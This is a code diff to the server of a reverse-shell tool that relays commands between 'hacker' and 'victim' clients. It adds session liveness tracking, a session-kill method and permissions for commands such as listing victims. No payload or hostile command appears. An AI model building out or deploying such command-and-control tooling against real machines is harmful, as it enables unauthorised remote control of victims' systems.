@@ -9,7 +9,7 @@ from http import HTTPStatus
 
 # from http.client import HTTPMessage
 from pathlib import Path
-from typing import Any, Literal, Optional, TypedDict
+from typing import Any, Optional, TypedDict
 
 import reverse_shell.utils as ut
 from reverse_shell import __app_name__, __version__
@@ -19,6 +19,12 @@ from reverse_shell.server import ErrorCodes as ec
 class Communication(TypedDict):
     command: str | None
     responses: list[str]
+
+
+class SessionKeys(TypedDict):
+    hacker_id: str
+    victim_id: str
+    alive: bool
 
 
 class Database:
@@ -185,18 +191,19 @@ class Sessions:
         # List of clients currently in session with a hacker.
         self._client_list = []
 
-        self._sessions: dict[str, dict[Literal["hacker_id", "victim_id"], str]] = {
+        self._sessions: dict[str, SessionKeys] = {
             # session_id: {
             #   hacker_id: "hacker_id",
-            #   victim_id: "victim_id"
+            #   victim_id: "victim_id",
+            #   active: True,
             # },
         }
 
         # The way the hacker and the victim talk is through this database.
         self._session_communications: dict[str, Communication] = {
             # session_id: {
-            #   command: "some command"
-            #   responses: ["Some responses", "here and there"]
+            #   command: "some command",
+            #   responses: ["Some responses", "here and there"],
             # }
         }
 
@@ -215,6 +222,7 @@ class Sessions:
         self._sessions[session_id] = {
             "hacker_id": hacker_id,
             "victim_id": victim_id,
+            "alive": True,
         }
 
         self._session_communications[session_id] = {
@@ -225,6 +233,25 @@ class Sessions:
         # And also add the hacker and victim in the client list
         self._client_list.extend([hacker_id, victim_id])
         return session_id
+
+    def kill_session(self, session_id: str):
+        """Deactivate the given session"""
+        # Make sure the session exists before activation
+        if not self.check_session_active(session_id):
+            raise Exception("session doesn't exist")
+
+        # Let's deactivate the session
+        self._sessions[session_id]["alive"] = False
+        # and let's remove the client's from the client_list
+        # to allow them to connect to more sessions after this
+
+    def check_session_alive(self, session_id: str):
+        """Check if the given session is alive"""
+        # first check if the session exists
+        if not self.check_session_active(session_id):
+            raise Exception("session does not exist")
+
+        return self._sessions[session_id]["alive"]
 
     def remove_session(self, session_id: str):
         """Remove the session based on the session id."""
@@ -369,6 +396,12 @@ class Config:
                 ut.ClientType.admin,
             ],
             ut.ServerCommands.get_session: [ut.ClientType.victim, ut.ClientType.admin],
+            ut.ServerCommands.list_victims: [ut.ClientType.hacker, ut.ClientType.admin],
+            ut.ServerCommands.exit_session: [ut.ClientType.hacker, ut.ClientType.admin],
+            ut.ServerCommands.delete_hacker: [
+                ut.ClientType.hacker,
+                ut.ClientType.admin,
+            ],
         }
 
         self.server_cmds = {
